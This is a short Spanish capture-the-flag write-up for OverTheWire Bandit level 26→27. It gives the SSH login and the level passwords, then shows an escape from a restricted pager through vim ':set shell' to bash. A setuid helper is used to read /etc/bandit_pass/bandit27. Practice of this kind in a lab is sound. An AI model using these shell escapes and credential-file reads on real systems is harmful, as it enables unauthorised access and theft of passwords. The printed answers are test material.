# LEVEL 26 → LEVEL 27

# Objetivo
Good job getting a shell! Now hurry and grab the password for bandit27!
# Datos de acceso al nivel
```
ssh bandit26@bandit.labs.overthewire.org -p 2220
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```
# Solución
```
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
--More--(66%)
v
_ _ _ _ ___ __
| | | (_) | |__ \ / /
| |__ __ _ _ __ __| |_| |_ ) / /_
| '_ \ / _` | '_ \ / _` | | __| / / '_ \
| |_) | (_| | | | | (_| | | |_ / /| (_) |
"~/text.txt" [readonly] 6L, 258B
:set shell=/bin/bash
:shell
[No write since last change]
bandit26@bandit:~$ bandit26@bandit:~$ ls
bandit27-do text.txt
bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
bandit26@bandit:~$
bandit26@bandit:~$ exit
```
# Notas Adicionales

# Referencias